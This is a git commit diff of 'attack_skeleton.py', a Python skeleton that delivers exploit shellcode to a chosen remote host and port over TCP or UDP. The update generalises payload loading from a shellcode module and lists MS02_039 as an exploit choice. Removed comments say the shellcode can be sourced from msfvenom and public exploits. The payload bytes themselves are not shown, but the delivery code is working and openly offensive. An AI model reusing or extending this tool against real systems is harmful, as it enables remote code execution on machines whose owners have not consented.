2369c3145c054c3ca4fe3c62bd46420c11a3a8f7
John Solo <33820078+my4andle@users.noreply.github.com>
2018-06-29 09:59:06 -0600

    Update attack_skeleton.py

--- attack_skeleton.py
+++ attack_skeleton.py
@@ -1,6 +1,7 @@
 #!/usr/bin/env python2
 """
 Usage:
+  attack_skeleton.py    -h | --help
   attack_skeleton.py    (--rhost=<rhost> --rport=<rport> --proto=<proto> --exploit=<exploit>) [--iface=<iface>]
 
 Options:
@@ -9,24 +10,21 @@ Options:
   --iface=<iface>       source interface
   --proto=<proto>       udp or tcp
   --exploit=<exploit>   shellcode for specific exploit must be loaded into script for your handler
+
 Exploit Choices:
     MS02_039
 """
 
 import subprocess
+import shellcode  # <-Insert payload in this file
 from socket import AF_INET, SOCK_DGRAM, SOCK_STREAM, socket
 from docopt import docopt
 from netifaces import ifaddresses
 
-# load all of your shellcode crafter for each exploit into this file
-# shellcode sources: msfvenom + reading the msf exploits works
-# shellcode sources: find public exploits and piec together required byte code
-from shellcode import ms02_039
-
 
 def send_udp(rhost, rport, payload, iface=None):
-    '''Send an exploit to a udp service'''
-    print "sending payload to {} at port {}".format(rhost, rport))
+    '''Send a payload to a udp port'''
+    print("sending payload to {} at port {} udp".format(rhost, rport))
     my_sock = socket(AF_INET, SOCK_DGRAM)
     if iface:
         iface_ip = ifaddresses(iface)[AF_INET][0]['addr']
@@ -35,8 +33,8 @@ def send_udp(rhost, rport, payload, iface=None):
     print("payload sent")
 
 def send_tcp(rhost, rport, payload, iface=None):
-    '''Send an exploit to a tcp service'''
-    print("sending payload to {} at port {}".format(rhost, rport))
+    '''Send a payload to a tcp port'''
+    print("sending payload to {} at port {} tcp".format(rhost, rport))
     soc = socket(AF_INET,SOCK_STREAM)
     soc.settimeout(2)
     if iface:
@@ -44,8 +42,8 @@ def send_tcp(rhost, rport, payload, iface=None):
         soc.bind((iface_ip, 0))
     soc.connect((rhost, int(rport)))
     soc.send(payload)
-    response = soc.recv(1024)
-    print(response)
+    response = soc.recv(1024)  # not sure if we care to receive?
+    print("payload sent")
 
 def main():
     opts = docopt(__doc__)
@@ -55,16 +53,9 @@ def main():
     rport = opts['--rport']
     proto = opts['--proto']
     exploit = opts['--exploit']
-    payload = b'x41'
     try:
-        if exploit.lower() == "ms02_039":
-            payload = ms02_039
-        else:
-            print("you need shellcode add for exploit {}".format(exploit))
-            print("Step 1: add code to shellcode.py")
-            print("Step 2: import your variable at the top of this file")
-            print("step 3: add an if condition like the one on line 60")
-            print("Don't worry, I will finish the tool eventually but for now im sending {}".format(payload))
+        payload = getattr(shellcode, exploit)
+        print(payload)
         if proto.lower() == "tcp":
             send_tcp(rhost=rhost, rport=rport, iface=iface, payload=payload)
         elif proto.lower() == "udp":
